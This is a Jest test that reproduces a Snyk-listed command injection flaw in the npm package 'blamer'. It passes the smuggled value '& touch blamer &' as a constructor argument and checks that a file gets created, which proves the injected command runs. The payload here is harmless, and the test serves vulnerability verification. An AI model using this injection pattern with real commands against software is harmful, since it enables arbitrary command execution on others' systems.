//https://snyk.io/vuln/SNYK-JS-BLAMER-559541
test("Command Injection in blamer", () => {
  const Root = require("blamer");
  const fs = require("fs");
  const path = "./blamer";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_command = "& touch blamer &";
  root = new Root("git", attack_command);
  root.blameByFile("./");
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
